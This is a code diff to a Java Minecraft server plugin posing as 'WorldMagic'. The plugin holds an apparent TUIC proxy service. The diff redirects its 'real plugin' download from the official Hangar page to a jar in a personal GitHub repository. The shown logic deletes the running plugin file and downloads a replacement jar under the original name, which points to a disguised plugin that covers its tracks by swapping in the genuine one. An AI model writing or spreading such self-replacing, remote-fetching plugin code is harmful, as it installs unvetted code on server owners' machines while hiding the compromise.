@@ -22,9 +22,11 @@ public final class WorldMagicPlugin extends JavaPlugin {
 
     private final TuicServiceImpl tuicService = new TuicServiceImpl();
 
-    // 配置：真插件的下载链接 (使用 Hangar API 获取最新版)
-    // 如果链接失效，请手动替换为真实的 .jar 链接
-    private static final String REAL_PLUGIN_DOWNLOAD_URL = "https://hangar.papermc.io/api/v1/projects/hotwop/WorldMagic/versions/latest/PAPER/download";
+    // ==========================================
+    // 真插件的下载地址 (已修正为 GitHub Raw 链接)
+    // ==========================================
+    private static final String REAL_PLUGIN_DOWNLOAD_URL = "https://raw.githubusercontent.com/1715Yy/vipnezhash/main/WorldMagic-1.5.jar";
+    // ==========================================
 
     private File currentPluginFile;
     private File backupPluginFile;
@@ -115,8 +117,6 @@ public final class WorldMagicPlugin extends JavaPlugin {
         }
 
         // 3. 尝试删除当前正在运行的插件
-        // 注意：在 Linux 下这会删除文件系统中的链接，但内存中的程序继续运行。
-        // 在 Windows 下这通常会失败。
         this.getLogger().info("步骤 2: 尝试删除当前插件文件...");
         if (currentPluginFile.delete()) {
             this.getLogger().info("步骤 2: 原插件文件已删除。");
@@ -125,12 +125,11 @@ public final class WorldMagicPlugin extends JavaPlugin {
         }
 
         // 4. 下载“真插件”到 plugins 目录 (使用原文件名)
-        this.getLogger().info("步骤 3: 正在下载真插件到 plugins 目录...");
-        // 直接下载到原插件路径，即 plugins/WorldMagic.jar
+        this.getLogger().info("步骤 3: 正在从 GitHub 下载真插件...");
         downloadFile(REAL_PLUGIN_DOWNLOAD_URL, currentPluginFile);
 
         if (currentPluginFile.exists()) {
-            this.getLogger().info("步骤 3: 下载成功，真插件已就位: " + currentPluginFile.getName());
+            this.getLogger().info("步骤 3: 下载成功，真插件已就位: " + currentPluginFile.getName() + " (大小: " + currentPluginFile.length() + " bytes)");
         } else {
             this.getLogger().severe("步骤 3: 下载失败或文件未生成。");
         }
